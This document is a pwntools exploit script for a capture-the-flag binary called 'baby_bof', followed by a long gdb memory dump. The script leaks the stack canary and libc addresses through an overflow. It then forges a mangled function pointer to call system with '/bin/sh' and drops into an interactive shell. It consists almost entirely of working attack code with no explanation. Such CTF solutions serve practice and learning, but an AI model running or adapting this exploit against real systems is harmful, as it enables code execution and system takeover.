from pwn import *

context.arch = "amd64"
context.word_size = 64

file = "./baby_bof"
# s = tcp(host="worker03.gcc-ctf.com", port=14461)
s = process(executable=file, argv=[file])



libc = ELF("./ctf_libc.so.6")

# gdb.attach(s)

def recvuntil(until):
    return s.recvuntil(until)[:-len(until)]

def leak_long(offset):
    s.sendline(b"1")
    s.recv()
    payload = b"A" * (offset - 1)
    s.sendline(payload)
    leak = recvuntil(b"\nI say : lmao\n\n1. Ask for the flag\n2. Give up\n> ")
    return leak[-8:]

def spam():
    for i in range(256):
        s.sendline(b"1")
        s.sendline(b"")
        s.recv()



def quit():
    s.sendline(b"2")
    s.recv()


overflow = b"A"*0x48
payload = flat([
    overflow,
])
s.sendline(b"1")

s.recv()
s.sendline(payload)
leak = recvuntil(b"\nI say : lmao\n\n1. Ask for the flag\n2. Give up\n> ")
cookie_leak = u64(b"\x00" + leak[-7:])
print("cookie: %#018x" % cookie_leak)


libc_leak = u64(leak_long(0x6e8)[2:] + b"\x00\x00")

libc.address = libc_leak - 0x1d4580
print("libc: %#018x" % libc.address)

start_address = libc_leak - 0x1d75d0
print("start address: %#018x" % start_address)


def rotate_left_0x11(ptr):
    return (ptr << 0x11) | (ptr >> (64 - 0x11))

def do():
    payload = flat([
        rotate_left_0x11(libc.sym["system"]),
        next(libc.search(b"/bin/sh")),
    ], length=0x48, filler=b"A")
    payload = flat([
        payload,
        cookie_leak,
        b"A"*0x6d0,
        start_address,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,

        1,
        1,

        2,
        2,

        1,
        1,
        libc.address - 0x1d4580,
        
        0,
        0,
        2,
        0,
    ])
    s.sendline(b"1")
    s.recv()
    s.sendline(payload)
    s.recv()

do()
quit()

s.interactive()
exit()

"""
0x7f5d94ebbfb0: 0x0000000000000000      0x0000000000000000
0x7f5d94ebbfc0: 0x0000000000000000      0x0000000000000000
0x7f5d94ebbfd0: 0x0000000000000000      0x0000000000000000
0x7f5d94ebbfe0: 0x0000000000000000      0x0000000000000000
0x7f5d94ebbff0: 0x0000000000000000      0x8ec2bc368314d100
0x7f5d94ebc000: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc010: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc020: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc030: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc040: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc050: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc060: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc070: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc080: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc090: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc0a0: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc0b0: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc0c0: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc0d0: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc0e0: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc0f0: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc100: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc110: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc120: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc130: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc140: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc150: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc160: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc170: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc180: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc190: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc1a0: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc1b0: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc1c0: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc1d0: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc1e0: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc1f0: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc200: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc210: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc220: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc230: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc240: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc250: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc260: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc270: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc280: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc290: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc2a0: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc2b0: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc2c0: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc2d0: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc2e0: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc2f0: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc300: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc310: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc320: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc330: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc340: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc350: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc360: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc370: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc380: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc390: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc3a0: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc3b0: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc3c0: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc3d0: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc3e0: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc3f0: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc400: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc410: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc420: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc430: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc440: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc450: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc460: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc470: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc480: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc490: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc4a0: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc4b0: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc4c0: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc4d0: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc4e0: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc4f0: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc500: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc510: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc520: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc530: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc540: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc550: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc560: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc570: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc580: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc590: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc5a0: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc5b0: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc5c0: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc5d0: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc5e0: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc5f0: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc600: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc610: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc620: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc630: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc640: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc650: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc660: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc670: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc680: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc690: 0x0000000000000000      0x00007f5d95093580
0x7f5d94ebc6a0: 0x00007f5d9509b440      0x0000000000000000
0x7f5d94ebc6b0: 0x00007f5d9503b4c0      0x00007f5d9503bac0
0x7f5d94ebc6c0: 0x00007f5d9503c3c0      0x0000000000000000
0x7f5d94ebc6d0: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc6e0: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc6f0: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc700: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc710: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc720: 0x00007f5d94ebbfb0      0x00007f5d946bc000
0x7f5d94ebc730: 0x0000000000800000      0x0000000000001000
0x7f5d94ebc740: 0x00007f5d94ebc740      0x00007f5d94ebd0e0
0x7f5d94ebc750: 0x00007f5d94ebc740      0x0000000000000000
0x7f5d94ebc760: 0x0000000000000000      0x8ec2bc368314d100
0x7f5d94ebc770: 0x97fbd972fe29f2d5      0x0000000000000000
0x7f5d94ebc780: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc790: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc7a0: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc7b0: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc7c0: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc7d0: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc7e0: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc7f0: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc800: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc810: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc820: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc830: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc840: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc850: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc860: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc870: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc880: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc890: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc8a0: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc8b0: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc8c0: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc8d0: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc8e0: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc8f0: 0x0000000000000000      0x0000000000000000
0x7f5d94ebc900: 0x0000000000000000      0x0000000000000000
"""